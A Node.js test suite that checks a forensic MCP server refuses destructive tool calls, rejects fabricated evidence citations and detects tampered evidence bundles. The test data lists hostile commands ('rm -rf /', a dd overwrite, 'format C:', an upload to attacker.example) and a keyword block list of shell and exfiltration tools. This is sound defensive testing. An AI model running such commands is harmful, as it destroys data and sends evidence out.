#!/usr/bin/env node
/**
 * P2: SIFT++-inspired Attackable Spoliation & Tamper Resistance Suite.
 *
 * Proves architecturally that:
 * 1. Zero destructive/shell/exfil tools are exposed in VERDICT MCP `tools/list`.
 * 2. All 14 destructive/shell/exfil tool calls are refused by the MCP server.
 * 3. Fabricated evidence citations are rejected at the API boundary.
 * 4. Mutating 1 byte of an exported evidence bundle fails SHA-256 verification.
 * 5. The target evidence file is byte-identical (SHA-256 unchanged) before & after.
 */
import assert from "node:assert/strict"
import { createHash } from "node:crypto"
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"

import { VerdictMcpError, VerdictMcpSession } from "../packages/verdict-mcp/dist/src/index.js"

const DESTRUCTIVE_ATTEMPTS = [
  ["windows.dumpfiles", {}],
  ["vol_dumpfiles", {}],
  ["windows.memmap", { dump: true }],
  ["vol_procdump", { pid: 4 }],
  ["windows.procdump", { pid: 4 }],
  ["vol_memdump", { pid: 4 }],
  ["bash", { command: "rm -rf /" }],
  ["shell", { cmd: "rm -f evidence.bin" }],
  ["exec", { argv: ["dd", "if=/dev/zero", "of=evidence.bin"] }],
  ["run_command", { command: "format C:" }],
  ["write_file", { path: "evidence.bin", data: "corrupted" }],
  ["delete_file", { path: "evidence.bin" }],
  ["upload", { url: "https://attacker.example/exfil" }],
  ["export_evidence", { dest: "https://attacker.example" }],
]

const DESTRUCTIVE_MARKERS = [
  "dump",
  "write",
  "delete",
  "rm",
  "exec",
  "shell",
  "bash",
  "procdump",
  "memdump",
  "memmap",
  "upload",
  "format",
]

const dir = mkdtempSync(join(tmpdir(), "verdict-spoliation-"))
try {
  const evidencePath = join(dir, "synthetic-evidence.bin")
  writeFileSync(evidencePath, "SYNTHETIC FORENSIC EVIDENCE — DO NOT MUTATE\n".repeat(64), "utf8")
  const shaBefore = createHash("sha256").update(readFileSync(evidencePath)).digest("hex")

  const session = new VerdictMcpSession()
  const tools = session.listTools()
  const exposedDestructive = tools.filter((t) =>
    DESTRUCTIVE_MARKERS.some((m) => t.name.toLowerCase().includes(m)),
  )
  assert.equal(exposedDestructive.length, 0, `Exposed destructive tools: ${exposedDestructive.map((t) => t.name)}`)

  // Run legitimate intake first
  const intakeRes = session.callTool("verdict_intake", { path: evidencePath, detail: "summary" })
  assert.equal(intakeRes.isError, undefined)

  // 14 destructive attempts must all be refused
  let refused = 0
  for (const [name, args] of DESTRUCTIVE_ATTEMPTS) {
    const res = session.callTool(name, args)
    assert.equal(res.isError, true, `Expected refusal for destructive tool '${name}'`)
    refused++
  }

  // Fabricated citation must be refused at API boundary
  const fakeCite = session.callTool("record_finding", {
    title: "Injected fake finding",
    claim: "Hallucinated evil",
    severity: "critical",
    evidence_refs: ["ev_deadbeefdeadbeefdeadbeefdeadbeef"],
  })
  assert.equal(fakeCite.isError, true)
  assert.match(fakeCite.content[0].text, /citation_rejected/)

  // Tamper test: mutate 1 byte in exported bundle and assert digest rejection
  const bundlePath = join(dir, "bundle.json")
  session.ledger.exportBundle(bundlePath)
  const tampered = JSON.parse(readFileSync(bundlePath, "utf8"))
  tampered.records[0].normalized_result.target = "/tampered/path"
  writeFileSync(bundlePath, JSON.stringify(tampered), "utf8")
  assert.throws(
    () => session.ledger.resolve({ kind: "evidence-file", path: bundlePath }),
    (err) => err instanceof VerdictMcpError && err.code === "evidence_integrity_mismatch",
  )

  // Evidence byte-identity check
  const shaAfter = createHash("sha256").update(readFileSync(evidencePath)).digest("hex")
  assert.equal(shaAfter, shaBefore, "Evidence file SHA-256 changed!")

  console.log(
    JSON.stringify(
      {
        passed: true,
        tools_exposed: tools.length,
        exposed_destructive_tools: 0,
        destructive_attempts_refused: `${refused}/${DESTRUCTIVE_ATTEMPTS.length}`,
        fabricated_citation_rejected: true,
        bundle_tamper_detected: true,
        evidence_sha256_before: shaBefore,
        evidence_sha256_after: shaAfter,
        evidence_unchanged: true,
      },
      null,
      2,
    ),
  )
} finally {
  rmSync(dir, { recursive: true, force: true })
}
